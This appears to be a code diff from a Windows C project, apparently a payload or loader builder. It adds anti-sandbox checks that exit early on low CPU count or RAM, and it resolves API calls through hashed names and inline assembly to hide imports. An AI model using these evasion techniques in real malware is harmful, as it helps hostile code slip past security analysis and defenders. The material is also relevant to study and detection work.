@@ -43,16 +43,6 @@ int get_disk_size(HMODULE hKernel32dll) {
     return totalSizeGB;
 }
 
-// char* c() {
-//     // not working
-//     // char country[256];
-//     // if (GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, ,country, sizeof(country)) == 0) {
-//     //     DWORD error = GetLastError();
-//     //     printf("Erreur lors de la récupération du pays. Code d'erreur : %lu\n", error);
-//     // }
-//     return "FR";
-// }
-
 
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
     unsigned int hash = 0;
@@ -108,7 +98,7 @@ bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
         "jmp end\n\t"
     "matching:\n\t"
         "mov $1, %[result]\n\t"
-    "end:\n\t"
+    "end:\n\t" // %
         : [result] "=r" (match)
         : [hash] "r" (prefix_hash.value), [string] "r" (str), [strlen] "r" (str_len), [rotation_value] "r" (prefix_hash.rotation_value), [is_ror] "m" (prefix_hash.is_rotation_right)                // Input
         : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory"
@@ -148,3 +138,34 @@ bool is_valid_language(HMODULE hKernel32) {
 }
 
 
+bool is_valid_computer(HMODULE hKernel32) {
+
+    // CPU section
+    GetSystemInfoFunc pGetSystemInfo = (GetSystemInfoFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_INFO_HASH);
+    SYSTEM_INFO sysInfo;
+    pGetSystemInfo(&sysInfo);
+    
+    if (sysInfo.dwNumberOfProcessors <= %SANDBOX__CPU_COUNT%) {
+        return false;
+    }
+    
+    // RAM section
+    GlobalMemoryStatusExFunc pGlobalMemoryStatusEx = (GlobalMemoryStatusExFunc)CustomGetProcAdress(hKernel32, GLOBAL_MEMORY_STATUS_HASH);
+    MEMORYSTATUSEX memStatus;
+    memStatus.dwLength = sizeof(memStatus);
+    if (pGlobalMemoryStatusEx(&memStatus) && memStatus.ullTotalPhys / (1024 * 1024) < %SANDBOX__RAM_SIZE%) {
+        return false;
+    }
+
+    // // Disk section
+    // ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
+    // int totalSizeGB = -11;
+    // GetDiskFreeSpaceExFuncA _GetDiskFreeSpace = (GetDiskFreeSpaceExFuncA)CustomGetProcAdress(hKernel32dll, GET_DISK_FREE_SPACE_HASH);
+    // if (_GetDiskFreeSpace("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
+    //     totalSizeGB = (int)((totalBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));
+    //     // int freeSizeGB = (int)((totalFreeBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));        
+    // }
+    // return totalSizeGB;
+
+    return true;
+}
